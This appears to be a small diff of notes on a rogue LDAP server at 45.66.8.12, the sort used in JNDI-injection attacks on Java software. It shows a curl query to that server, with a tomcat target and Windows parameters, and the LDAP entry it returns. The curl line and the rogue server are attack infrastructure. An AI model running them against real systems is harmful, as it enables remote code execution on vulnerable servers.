@@ -1,7 +1,7 @@
 ROGUE LDAP 45.66.8.12
 
 
-curl ldap:/45(.)66.8.12:1328/o=tomcat&host=<fake_site>.com&path=&file=&param=requestpath&info=windows is done.
+curl ldap:/45(.)66.8.12:1328/o=tomcat&host=<fake_site>.com&path=&file=&param=requestpath&info=windows 
 
 root@ubuntu:/# DN: o=tomcat
 	javaClassName: java.lang.String
